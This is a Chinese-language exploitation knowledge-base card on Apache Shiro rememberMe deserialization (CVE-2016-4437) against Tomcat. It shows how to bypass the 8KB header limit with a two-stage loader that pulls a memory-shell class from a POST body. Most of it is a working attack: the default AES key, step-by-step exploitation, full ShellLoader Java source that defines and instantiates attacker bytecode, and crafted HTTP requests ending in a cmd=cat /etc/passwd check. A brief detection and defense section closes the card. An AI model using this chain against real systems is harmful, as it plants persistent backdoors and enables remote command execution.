---
id: web-java-framework-shiro-rememberme-two-stage-memshell-loader
title: Shiro rememberMe 8KB 头限制绕过：两段式 ShellLoader 从 POST 加载内存马类
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-rememberme-two-stage-class-loader
aliases:
- Shiro 内存马注入
- Shiro Cookie 8KB 限制绕过
- 两段式 ShellLoader
- rememberMe 小载荷 + POST 大载荷
- TomcatEcho 取 Request
- Shiro 分阶段加载内存马
tags:
- java
- shiro
- rememberme
- deserialization
- memshell
- tomcat
- tomcat-echo
- defineclass
- cve-2016-4437
cve:
- CVE-2016-4437
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:27:40+08:00'
  notes: 已对照原文与图01-07核对：vulhub CVE-2016-4437 环境、默认密钥、8411 字节请求 400、两段式 ShellLoader 从 POST code 取类、响应 load success classInfo Inject、cmd 回显 /etc/passwd 均与原文一致。affected_versions 已清除：原文只给出 vulhub 靶场/pom 依赖 1.2.4（目标环境），未明确声明受影响版本区间。未复现 PoC。
---

## 一句话结论

Tomcat 默认 `maxHttpHeaderSize` 为 8KB，直接把内存马注入类的 Base64 塞进 `rememberMe` Cookie 会得到 400 Bad Request；可改用两段式：Cookie 里只放一个体积很小的 `ShellLoader`（AbstractTranslet），它在反序列化时通过 TomcatEcho 反射链从当前请求线程拿到 `org.apache.catalina.connector.Request`，再从 POST 参数 `code` 读取真正的大体积注入类字节码，`defineClass` + `newInstance` 完成内存马注入。这样 Cookie 保持小体积，载荷大小只受 POST body 限制。

## 原理

- **Shiro-550 基线**：`rememberMe` Cookie 是 `Base64(IV + AES-CBC(Java 序列化数据))`，默认密钥 `kPH+bIxk5D2deZiIxcaaaA==`；服务端反序列化时可触发 CommonsCollections + `TemplatesImpl` 链执行 `_bytecodes` 中的 `AbstractTranslet` 子类。
- **8KB 限制**：Tomcat 对请求头总大小有默认限制（`maxHttpHeaderSize`，约 8KB）。把完整的内存马注入类（`Inject`）编译、Base64 后放进 Cookie，请求头远超限制，Tomcat 直接返回 400 Bad Request（原文 8411 字节请求即失败）。
- **两段式拆分**：
  - 第一段：Cookie 里只放 `ShellLoader`。它同样继承 `AbstractTranslet`，经 `TemplatesImpl` 链加载；类体很小（只含反射链和加载逻辑），Base64 后仍在 8KB 内。
  - 第二段：真正要注入的 `Inject` 类字节码 Base64 后放在 POST body 的 `code` 参数；`ShellLoader` 在运行时读取并 `defineClass`。
- **没有全局 request 怎么取 POST**：`ShellLoader` 的静态代码块在反序列化/类初始化时执行，此时没有 Servlet 的全局 request 变量。利用 Tomcat 的对象持有关系，从当前线程的 `WebappClassLoaderBase` 一路反射到 `org.apache.coyote.Request`，再 `getNote(1)` 拿到 `org.apache.catalina.connector.Request`：
  ```text
  Thread.currentThread().getContextClassLoader()  // WebappClassLoaderBase
   → resources: StandardRoot
   → context: StandardContext
   → context: ApplicationContext
   → service: StandardService
   → connectors[0]: Connector
   → protocolHandler: AbstractProtocol
   → handler: AbstractProtocol$ConnectionHandler
   → global: RequestGroupInfo
   → processors: ArrayList<RequestInfo>
   → req: org.apache.coyote.Request
   → req.getNote(1): org.apache.catalina.connector.Request
  ```
  这条链即 TomcatEcho 的请求获取方式；拿到 `Request` 后即可 `getParameter("code")` 和 `getResponse().getWriter()`。
- **执行**：`ShellLoader` 静态块遍历 `RequestInfo`，对每个请求取出 `Request`/`Response`，Base64 解码 `code`，用 `ClassLoader.defineClass` 定义 `Inject` 类并 `newInstance()`；`Inject` 构造函数再执行 Tomcat Filter 动态注册（见关联卡），形成内存马。
- **为什么有效**：8KB 限制只作用于请求头；body 通常允许数 MB。把“大体积类字节码”从 header 移到 body，保留 header 中只够放加载器的最小序列化链，既绕过限制又不改变反序列化触发点。

## 触发条件

- 目标为 Shiro <= 1.2.4 且使用默认/已知 AES 密钥，rememberMe 反序列化可利用（CommonsCollections 等 gadget 在 classpath）。
- 目标容器为 Tomcat（TomcatEcho 反射链依赖 Tomcat 的 `StandardRoot`/`RequestInfo` 结构）；版本字段名可能随 Tomcat 版本变化。
- 攻击者能发送同时带 rememberMe Cookie 和 POST body 的请求；body 未被 WAF 按大小/内容阻断。
- 注入类字节码与目标 JDK 版本兼容；`defineClass` 使用的 ClassLoader 能加载所需依赖。
- 目标未对 rememberMe/反序列化做拦截，也未禁用 `TemplatesImpl` 等类。

## 利用步骤

1. 按 Shiro-550 方式用默认密钥构造 `TemplatesImpl` 链，但 `_bytecodes` 指向 `ShellLoader` 而不是完整 `Inject`。
2. 生成 `ShellLoader` 的序列化 + AES + Base64 载荷，放入 `Cookie: rememberMe=...`，确认请求头小于 8KB。
3. 把 `Inject`（或最终内存马类）编译后 Base64，URL 编码后放入 POST body：`code=<urlencode(base64(classbytes))>`。
4. 发送请求；`ShellLoader` 静态块通过 TomcatEcho 链取到当前 Request，读取 `code`，`defineClass` 并 `newInstance`。
5. 响应中出现 `load success, classInfo: Inject`，说明类已加载并实例化；`Inject` 构造函数完成 Filter 注册。
6. 访问任意路径并带 `cmd=cat /etc/passwd` 验证内存马执行。

## PoC

`ShellLoader` 关键代码：

```java
public class ShellLoader extends AbstractTranslet {
    public static Object getField(Object obj, Class<?> clazz, String... fieldNames) throws Exception {
        for (String part : fieldNames) {
            String[] segs = part.split("_", 2);
            Field field = clazz.getDeclaredField(segs[0].split(":")[0]);
            field.setAccessible(true);
            obj = field.get(obj);
            if (segs.length > 1) {
                String[] parts = segs[1].split(":", 2);
                int idx = Integer.parseInt(parts[0]);
                obj = obj instanceof List ? ((List<?>) obj).get(idx) : Array.get(obj, idx);
                clazz = parts.length > 1 ? Class.forName(parts[1]) : obj.getClass();
            } else {
                clazz = part.contains(":") ? Class.forName(part.split(":")[1]) : field.getType();
            }
        }
        return obj;
    }

    static {
        try {
            ArrayList<RequestInfo> infos = (ArrayList<RequestInfo>) getField(
                Thread.currentThread().getContextClassLoader(),
                WebappClassLoaderBase.class,
                "resources:org.apache.catalina.webresources.StandardRoot",
                "context:org.apache.catalina.core.StandardContext",
                "context",
                "service:org.apache.catalina.core.StandardService",
                "connectors_0:org.apache.catalina.connector.Connector",
                "protocolHandler:org.apache.coyote.AbstractProtocol",
                "handler:org.apache.coyote.AbstractProtocol$ConnectionHandler",
                "global", "processors");

            for (RequestInfo ri : infos) {
                org.apache.coyote.Request r = (org.apache.coyote.Request)
                    getField(ri, RequestInfo.class, "req");
                Request req = (Request) r.getNote(1);
                Response resp = req.getResponse();
                PrintWriter out = resp.getWriter();

                byte[] bytes = Base64.getDecoder().decode(req.getParameter("code"));
                Method m = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, int.class, int.class);
                m.setAccessible(true);
                Class clazz = (Class) m.invoke(ShellLoader.class.getClassLoader(), bytes, 0, bytes.length);
                out.println("load success, classInfo: " + clazz.getName());
                clazz.newInstance();
            }
        } catch (Exception e) {}
    }
}
```

请求：

```http
POST / HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Cookie: rememberMe=<ShellLoader 的 AES+Base64 载荷，< 8KB>

code=<URL 编码后的 Inject.class Base64>
```

响应示例：

```text
load success, classInfo: Inject
```

之后访问：

```http
GET /login?cmd=cat%20/etc/passwd HTTP/1.1
```

返回 `/etc/passwd` 内容，证明 Filter 内存马已生效。原文本地 vulhub 环境实测成功。

## 变体与关联

- **载荷位置变体**：`code` 也可放在自定义请求头（注意同样受 8KB 限制）、Cookie 其他字段、multipart 文件；关键是第一段 ShellLoader 足够小。
- **取 Request 变体**：除 TomcatEcho 链外，还可从 `ApplicationContext`、`StandardContext` 的 `request`/`response` 字段、线程局部变量或 Spring `RequestContextHolder` 获取；不同 Tomcat 版本字段名需调整。
- **加载方式变体**：`defineClass` 后不一定 `newInstance`，也可用 `Class.forName(name, true, loader)` 触发静态块；需要构造函数副作用时用 `newInstance`。
- **最终内存马类型变体**：Filter、Servlet、Listener、Valve、Spring Controller（见 `web-java-framework-spring-mvc-dynamic-controller-memshell`）或 WebFlux Filter（见 `web-java-framework-spring-webflux-filteringwebhandler-memshell`）。
- **与 Shiro-550 卡的关系**：`web-java-framework-shiro-550-hardcoded-key-deserialization` 讲密钥与反序列化基线；本卡讲“载荷过大放不进 Cookie”时的两段式投递，以及从 body 取类的 TomcatEcho 链。
- **与 Tomcat Filter 内存马卡的关系**：本卡负责把 `Inject` 类送进内存；`Inject` 的具体 Filter 注册逻辑见 `web-java-component-tomcat-dynamic-filter-memshell`。

## 检测与防御

- 修复 Shiro-550：升级 Shiro、轮换/随机化 rememberMe AES 密钥，禁用不必要的 rememberMe；对反序列化入口加类白名单（ObjectInputFilter/JEP 290）。
- 限制/监控 rememberMe Cookie 长度与内容；对超长 Cookie、异常 Base64 直接拒绝。
- 检测两段式特征：同一请求中 rememberMe 反序列化载荷 + body 中 `code` 为超长 Base64；响应出现 `load success, classInfo:`。
- 监控 `ClassLoader#defineClass`、反射调用 `ClassLoader.defineClass`、`TemplatesImpl.newTransformer`、TomcatEcho 反射链字段访问；RASP 对 `StandardRoot`/`RequestInfo`/`getNote(1)` 链告警。
- 运行时排查：`StandardContext.filterDefs` 出现未知 filter、`filterStart` 后新增 `/*` 映射、进程中出现非应用 JAR 来源的 Filter 类。
